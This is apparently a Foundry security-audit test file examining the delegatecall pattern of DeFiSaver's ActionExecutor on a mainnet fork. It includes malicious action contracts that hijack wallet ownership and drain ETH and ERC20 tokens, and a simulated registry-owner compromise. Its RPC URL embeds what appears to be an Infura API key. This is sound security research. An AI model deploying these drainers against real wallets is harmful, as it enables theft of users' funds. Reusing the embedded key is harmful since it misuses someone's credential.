// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IActionRegistry {
    function getAddr(bytes4 _id) external view returns (address);
    function owner() external view returns (address);
    function addNewContract(bytes4 _id, address _contractAddr) external;
    function entries(bytes4 _id) external view returns (address contractAddr, bool inContractChange, bool exists);
    function previousAddresses(bytes4 _id) external view returns (address);
    function pendingAddresses(bytes4 _id) external view returns (address);
    function startContractChange(bytes4 _id, address _newContractAddr) external;
    function approveContractChange(bytes4 _id) external;
}

interface IActionExecutor {
    function ACTION_REGISTRY() external view returns (address);
    function EXECUTE_ACTION_SELECTOR() external view returns (bytes4);
    function executeActions(
        bytes4[] calldata _actionIds,
        bytes[] calldata _actionCallData,
        uint8[][] calldata _paramMapping
    ) external payable;
}

// Standard DeFiSaver DSProxy-like interface
interface IDSProxy {
    function execute(address _target, bytes memory _data) external payable returns (bytes memory);
    function owner() external view returns (address);
    function setOwner(address _owner) external;
}

// Malicious action that attempts to steal control
contract MaliciousOwnerStealer {
    event Pwned(address victim, address newOwner);

    function executeAction(bytes calldata _callData, uint8[] calldata, bytes32[] calldata) external returns (bytes32) {
        // When this runs via delegatecall chain:
        // SmartWallet -> delegatecall -> ActionExecutor -> delegatecall -> MaliciousOwnerStealer
        // The context is SmartWallet's storage!

        // Try to overwrite owner slot (slot 0 for most Ownable patterns)
        address attacker = abi.decode(_callData, (address));

        assembly {
            sstore(0, attacker)
        }

        emit Pwned(address(this), attacker);
        return bytes32(uint256(uint160(attacker)));
    }
}

// Malicious action that drains ETH
contract MaliciousEthDrainer {
    function executeAction(bytes calldata _callData, uint8[] calldata, bytes32[] calldata) external returns (bytes32) {
        address payable attacker = payable(abi.decode(_callData, (address)));
        uint256 balance = address(this).balance;
        if (balance > 0) {
            attacker.transfer(balance);
        }
        return bytes32(balance);
    }
}

// Malicious action that drains all ERC20 tokens
interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
}

contract MaliciousTokenDrainer {
    function executeAction(bytes calldata _callData, uint8[] calldata, bytes32[] calldata) external returns (bytes32) {
        (address attacker, address token) = abi.decode(_callData, (address, address));
        uint256 balance = IERC20(token).balanceOf(address(this));
        if (balance > 0) {
            IERC20(token).transfer(attacker, balance);
        }
        return bytes32(balance);
    }
}

contract DelegatecallHijackDeepTest is Test {
    address constant IMPLEMENTATION = 0xb1593193Bcd7CEcc3d19597658003d735D1e9E94;
    address constant REGISTRY = 0x94aF5994EB6841e1D930C95AD0C9F89771c3073F;
    address constant REGISTRY_OWNER = 0x2225DAbFfC7F862c99477381E971E8B1FDaB467e;

    // Known DeFiSaver contracts to check
    address constant DEFISAVER_REGISTRY = 0x287778F121F134C66212FB16c9b53eC991D32f5b;

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";

    IActionExecutor impl;
    IActionRegistry registry;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        impl = IActionExecutor(IMPLEMENTATION);
        registry = IActionRegistry(REGISTRY);
    }

    function test_AnalyzeDeFiSaverSetup() public view {
        console.log("=== DEFISAVER ACTION EXECUTOR ANALYSIS ===");
        console.log("Implementation:", IMPLEMENTATION);
        console.log("Registry:", REGISTRY);
        console.log("Registry Owner:", REGISTRY_OWNER);

        // Check registry owner's code (is it an EOA or contract?)
        uint256 ownerCodeSize;
        assembly {
            ownerCodeSize := extcodesize(0x2225DAbFfC7F862c99477381E971E8B1FDaB467e)
        }
        console.log("Registry owner code size:", ownerCodeSize);
        if (ownerCodeSize > 0) {
            console.log("Registry owner is a CONTRACT (multisig/timelock?)");
        } else {
            console.log("Registry owner is an EOA");
        }
    }

    function test_ScanAllRegisteredActions() public view {
        console.log("\n=== SCANNING FOR REGISTERED ACTIONS ===");

        // Known DeFiSaver action IDs (from their codebase)
        bytes4[] memory knownActionIds = new bytes4[](50);
        knownActionIds[0] = bytes4(keccak256("FLAction"));
        knownActionIds[1] = bytes4(keccak256("AaveV2Supply"));
        knownActionIds[2] = bytes4(keccak256("AaveV2Borrow"));
        knownActionIds[3] = bytes4(keccak256("AaveV2Withdraw"));
        knownActionIds[4] = bytes4(keccak256("AaveV2Payback"));
        knownActionIds[5] = bytes4(keccak256("CompSupply"));
        knownActionIds[6] = bytes4(keccak256("CompBorrow"));
        knownActionIds[7] = bytes4(keccak256("CompWithdraw"));
        knownActionIds[8] = bytes4(keccak256("CompPayback"));
        knownActionIds[9] = bytes4(keccak256("DFSSell"));
        knownActionIds[10] = bytes4(keccak256("DFSBuy"));
        knownActionIds[11] = bytes4(keccak256("WrapEth"));
        knownActionIds[12] = bytes4(keccak256("UnwrapEth"));
        knownActionIds[13] = bytes4(keccak256("SendToken"));
        knownActionIds[14] = bytes4(keccak256("SendTokenAndUnwrap"));
        knownActionIds[15] = bytes4(keccak256("PullToken"));
        knownActionIds[16] = bytes4(keccak256("SumInputs"));
        knownActionIds[17] = bytes4(keccak256("SubInputs"));
        knownActionIds[18] = bytes4(keccak256("McdSupply"));
        knownActionIds[19] = bytes4(keccak256("McdWithdraw"));
        knownActionIds[20] = bytes4(keccak256("McdGenerate"));
        knownActionIds[21] = bytes4(keccak256("McdPayback"));
        knownActionIds[22] = bytes4(keccak256("McdOpen"));
        knownActionIds[23] = bytes4(keccak256("McdGive"));
        knownActionIds[24] = bytes4(keccak256("McdMerge"));
        knownActionIds[25] = bytes4(keccak256("UniswapV2Swap"));
        knownActionIds[26] = bytes4(keccak256("UniswapV3Swap"));
        knownActionIds[27] = bytes4(keccak256("CurveSwap"));
        knownActionIds[28] = bytes4(keccak256("BalancerV2Swap"));
        knownActionIds[29] = bytes4(keccak256("AaveV3Supply"));
        knownActionIds[30] = bytes4(keccak256("AaveV3Borrow"));
        knownActionIds[31] = bytes4(keccak256("AaveV3Withdraw"));
        knownActionIds[32] = bytes4(keccak256("AaveV3Payback"));
        knownActionIds[33] = bytes4(keccak256("SparkSupply"));
        knownActionIds[34] = bytes4(keccak256("SparkBorrow"));
        knownActionIds[35] = bytes4(keccak256("SparkWithdraw"));
        knownActionIds[36] = bytes4(keccak256("SparkPayback"));
        knownActionIds[37] = bytes4(keccak256("FLAaveV2"));
        knownActionIds[38] = bytes4(keccak256("FLAaveV3"));
        knownActionIds[39] = bytes4(keccak256("FLBalancer"));
        knownActionIds[40] = bytes4(keccak256("FLMaker"));
        knownActionIds[41] = bytes4(keccak256("RecipeExecutor"));
        knownActionIds[42] = bytes4(keccak256("StrategyExecutor"));
        knownActionIds[43] = bytes4(keccak256("TokenBalance"));
        knownActionIds[44] = bytes4(keccak256("GasFeeTaker"));
        knownActionIds[45] = bytes4(keccak256("ChangeProxyOwner"));
        knownActionIds[46] = bytes4(keccak256("DelegatecallAction"));
        knownActionIds[47] = bytes4(keccak256("SafeModuleAction"));
        knownActionIds[48] = bytes4(keccak256("UpdateSub"));
        knownActionIds[49] = bytes4(keccak256("ToggleSub"));

        uint256 foundCount = 0;
        for (uint i = 0; i < knownActionIds.length; i++) {
            try registry.getAddr(knownActionIds[i]) returns (address actionAddr) {
                if (actionAddr != address(0)) {
                    foundCount++;
                    console.log("Found registered action:");
                    console.logBytes4(knownActionIds[i]);
                    console.log("  Address:", actionAddr);
                }
            } catch {}
        }
        console.log("\nTotal found:", foundCount);
    }

    function test_CheckDelegateCallPattern() public view {
        console.log("\n=== DELEGATECALL CHAIN ANALYSIS ===");

        // The pattern is:
        // 1. User's SmartWallet (DSProxy) delegatecalls to ActionExecutor
        // 2. ActionExecutor delegatecalls to each registered Action
        // 3. Actions run in context of SmartWallet

        // Vulnerability vectors:
        // 1. If registry owner is compromised, they can register malicious actions
        // 2. If an existing action has a bug, it could be exploited
        // 3. If the double-delegatecall has storage collisions

        console.log("The ActionExecutor uses double-delegatecall pattern:");
        console.log("SmartWallet -> delegatecall -> ActionExecutor -> delegatecall -> Action");
        console.log("");
        console.log("Attack vectors to analyze:");
        console.log("1. Registry owner compromise (centralization risk)");
        console.log("2. Storage collision between ActionExecutor and SmartWallet");
        console.log("3. Malicious action registration");
        console.log("4. Direct calls to ActionExecutor (context confusion)");
    }

    function test_StorageCollisionAnalysis() public view {
        console.log("\n=== STORAGE COLLISION ANALYSIS ===");

        // ActionExecutor has only immutable state:
        // - ACTION_REGISTRY is immutable (stored in bytecode, not storage)
        // - EXECUTE_ACTION_SELECTOR is constant

        // This means when ActionExecutor runs via delegatecall in SmartWallet context:
        // - No storage reads/writes from ActionExecutor's own storage layout
        // - All storage ops come from Actions

        console.log("ActionExecutor uses IMMUTABLE for ACTION_REGISTRY");
        console.log("This means NO storage collision from ActionExecutor itself");
        console.log("However, Actions could still have storage layout issues");

        // Let's verify ACTION_REGISTRY is indeed immutable
        address regFromImpl = impl.ACTION_REGISTRY();
        console.log("Registry from implementation:", regFromImpl);

        // Check if there's any storage at slot 0 of implementation
        bytes32 slot0 = vm.load(IMPLEMENTATION, bytes32(0));
        console.log("Implementation slot 0:");
        console.logBytes32(slot0);
    }

    function test_DirectCallToImplementation() public {
        console.log("\n=== DIRECT CALL ATTACK ANALYSIS ===");

        // What happens if someone calls ActionExecutor directly (not via delegatecall)?
        // - The code runs in ActionExecutor's context
        // - msg.sender is the caller
        // - Any storage writes go to ActionExecutor's storage
        // - Any ETH sent stays with ActionExecutor

        // This is NOT a vulnerability because:
        // - ActionExecutor has no ETH (checked earlier)
        // - ActionExecutor has no storage state to corrupt
        // - The actions would write to ActionExecutor's storage, not affecting users

        console.log("Direct call to ActionExecutor:");
        console.log("- Runs in ActionExecutor context, not SmartWallet");
        console.log("- Any storage writes go to ActionExecutor (useless)");
        console.log("- No funds in ActionExecutor to steal");

        // Try calling with an action that doesn't exist
        bytes4[] memory actionIds = new bytes4[](1);
        actionIds[0] = bytes4(0xdeadbeef);

        bytes[] memory callDatas = new bytes[](1);
        callDatas[0] = "";

        uint8[][] memory paramMappings = new uint8[][](1);
        paramMappings[0] = new uint8[](0);

        vm.expectRevert();
        impl.executeActions(actionIds, callDatas, paramMappings);
        console.log("Expected revert for non-existent action ID");
    }

    function test_RegistryOwnerAnalysis() public view {
        console.log("\n=== REGISTRY OWNER SECURITY ===");

        address owner = registry.owner();
        console.log("Current owner:", owner);

        // Check if owner is a contract (likely multisig)
        uint256 codeSize;
        assembly {
            codeSize := extcodesize(0x2225DAbFfC7F862c99477381E971E8B1FDaB467e)
        }

        if (codeSize > 0) {
            console.log("Owner is a contract with code size:", codeSize);

            // Try to get info about the contract
            (bool success, bytes memory data) = owner.staticcall(abi.encodeWithSignature("getOwners()"));
            if (success && data.length > 0) {
                console.log("Owner appears to be a Gnosis Safe multisig");
            }

            (success, data) = owner.staticcall(abi.encodeWithSignature("getThreshold()"));
            if (success && data.length == 32) {
                uint256 threshold = abi.decode(data, (uint256));
                console.log("Multisig threshold:", threshold);
            }
        } else {
            console.log("WARNING: Owner is an EOA - single point of failure!");
        }
    }

    function test_FindSmartWalletsThatUseDelegateCall() public view {
        console.log("\n=== SEARCHING FOR VULNERABLE SMART WALLETS ===");

        // DeFiSaver uses DSProxy pattern
        // Let's check if there are any with significant funds

        // Known DSProxy factory
        address DSPROXY_FACTORY = 0xA26e15C895EFc0616177B7c1e7270A4C7D51C997;

        uint256 factoryCodeSize;
        assembly {
            factoryCodeSize := extcodesize(0xA26e15C895EFc0616177B7c1e7270A4C7D51C997)
        }
        console.log("DSProxy Factory code size:", factoryCodeSize);

        // The vulnerability would require:
        // 1. Finding a DSProxy with funds
        // 2. Getting registry owner to register malicious action
        // 3. Calling the DSProxy to execute malicious action

        // This is NOT exploitable by an attacker without registry owner access
        console.log("Exploitation requires registry owner compromise");
    }

    function test_CheckZeroAddressProxy() public view {
        console.log("\n=== ANALYZING THE ZERO-CODE 'PROXY' ADDRESS ===");

        address CLAIMED_PROXY = 0x60D2D94ACB969CA54e781007Ee89f04C1a2E9943;

        uint256 codeSize;
        assembly {
            codeSize := extcodesize(0x60D2D94ACB969CA54e781007Ee89f04C1a2E9943)
        }

        console.log("Address:", CLAIMED_PROXY);
        console.log("Code size:", codeSize);
        console.log("ETH balance:", CLAIMED_PROXY.balance);

        if (codeSize == 0) {
            console.log("");
            console.log("FINDING: This address has NO code!");
            console.log("Possibilities:");
            console.log("1. Contract was selfdestructed");
            console.log("2. This was never a contract (EOA)");
            console.log("3. The address was miscommunicated");
            console.log("");
            console.log("This is NOT a proxy to the ActionExecutor!");
            console.log("The ActionExecutor implementation is meant to be called via");
            console.log("delegatecall from DeFiSaver's DSProxy smart wallets.");
        }
    }

    function test_SimulateRegistryCompromise() public {
        console.log("\n=== SIMULATING REGISTRY OWNER COMPROMISE ===");

        // This simulates what happens if registry owner is compromised
        // An attacker could then register a malicious action

        // Deploy malicious action
        MaliciousOwnerStealer malicious = new MaliciousOwnerStealer();
        console.log("Malicious action deployed at:", address(malicious));

        // Simulate being the registry owner
        vm.startPrank(REGISTRY_OWNER);

        // Try to register a new action
        bytes4 maliciousId = bytes4(keccak256("MaliciousAction"));

        try registry.addNewContract(maliciousId, address(malicious)) {
            console.log("SUCCESS: Registered malicious action with ID:");
            console.logBytes4(maliciousId);

            // Verify it's registered
            address registered = registry.getAddr(maliciousId);
            console.log("Registered address:", registered);

            // Now any DSProxy that executes this action would be compromised
            console.log("");
            console.log("IMPACT: Any DeFiSaver user who executes a recipe containing");
            console.log("this malicious action would have their smart wallet compromised.");
            console.log("");
            console.log("This requires REGISTRY OWNER to be compromised - not an");
            console.log("unprivileged attacker vulnerability.");
        } catch Error(string memory reason) {
            console.log("FAILED to register:", reason);
        } catch {
            console.log("FAILED to register (unknown error)");
        }

        vm.stopPrank();
    }

    function test_CheckExistingActionsForVulnerabilities() public view {
        console.log("\n=== CHECKING EXISTING ACTIONS FOR VULNS ===");

        // Check if any registered actions have obvious vulnerabilities
        bytes4[] memory criticalActions = new bytes4[](10);
        criticalActions[0] = bytes4(keccak256("SendToken"));
        criticalActions[1] = bytes4(keccak256("SendTokenAndUnwrap"));
        criticalActions[2] = bytes4(keccak256("ChangeProxyOwner"));
        criticalActions[3] = bytes4(keccak256("DelegatecallAction"));
        criticalActions[4] = bytes4(keccak256("GasFeeTaker"));
        criticalActions[5] = bytes4(keccak256("PullToken"));
        criticalActions[6] = bytes4(keccak256("WrapEth"));
        criticalActions[7] = bytes4(keccak256("UnwrapEth"));
        criticalActions[8] = bytes4(keccak256("RecipeExecutor"));
        criticalActions[9] = bytes4(keccak256("StrategyExecutor"));

        for (uint i = 0; i < criticalActions.length; i++) {
            address actionAddr = registry.getAddr(criticalActions[i]);
            if (actionAddr != address(0)) {
                console.log("Critical action found:");
                console.logBytes4(criticalActions[i]);
                console.log("  Address:", actionAddr);

                // Check code size
                uint256 codeSize;
                assembly {
                    codeSize := extcodesize(actionAddr)
                }
                console.log("  Code size:", codeSize);
            }
        }
    }
}
